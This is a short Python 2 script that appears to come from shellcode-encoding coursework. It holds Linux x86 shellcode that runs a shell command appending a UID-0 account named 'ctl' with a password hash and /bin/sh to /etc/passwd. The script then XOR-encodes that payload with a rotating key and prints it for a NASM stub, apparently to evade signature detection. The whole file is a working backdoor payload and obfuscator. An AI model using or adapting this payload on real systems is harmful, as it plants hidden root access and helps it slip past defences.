#!/usr/bin/python
# Add shellcode from objdump addAcct to shellcode
# run encoder with 'python encoder.py'
# Add encoded payload to fpuMMX_addRootUser.nasm
shellcode =  "\xeb\x27\x5e\x31\xc0\x50\x8d\x14\x24\xff\x76\x2a\xff\x76\x26\x8d"
shellcode += "\x0c\x24\x88\x46\x02\x88\x46\x3d\x50\x8d\x5e\x03\x53\x8d\x1e\x53"
shellcode += "\x89\xcb\x53\x89\xe1\xb0\x0b\xcd\x80\xe8\xd4\xff\xff\xff\x2d\x63"
shellcode += "\x23\x2f\x62\x69\x6e\x2f\x65\x63\x68\x6f\x20\x63\x74\x6c\x3a\x4e"
shellcode += "\x4e\x77\x5a\x38\x44\x31\x51\x6a\x56\x79\x33\x59\x3a\x30\x3a\x30"
shellcode += "\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x20\x3e\x3e\x20"
shellcode += "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
encoded = ""
bEncode = 0
counter = 0
scLength = len(bytearray(shellcode))

# Encoder Order: cc ee 9b d9 74 24 f4 5f
for x in bytearray(shellcode) :
	bEncode %= 8
	if bEncode == 0:
		y = x^0xCC
	elif bEncode == 1:
		y = x^0xEE
	elif bEncode == 2:
		y = x^0xD9
	elif bEncode == 3:
		y = x^0xEE
	elif bEncode == 4:
		y = x^0xCC
	elif bEncode == 5:
		y = x^0xD9
	elif bEncode == 6:
		y = x^0xD9
	elif bEncode == 7:
		y = x^0xCC
	bEncode += 1
	counter += 1
	encoded += '0x'
	if counter == scLength:
		encoded += '%02x' %y
	else:
		encoded += '%02x,' %y

formatSC = '\\\n\t'.join(encoded[i:i+50] for i in range(0,len(encoded), 50))
print "[------------------Encoded-ASM-Payload---------------------]"
print 'payload: db \\\n\t'+formatSC
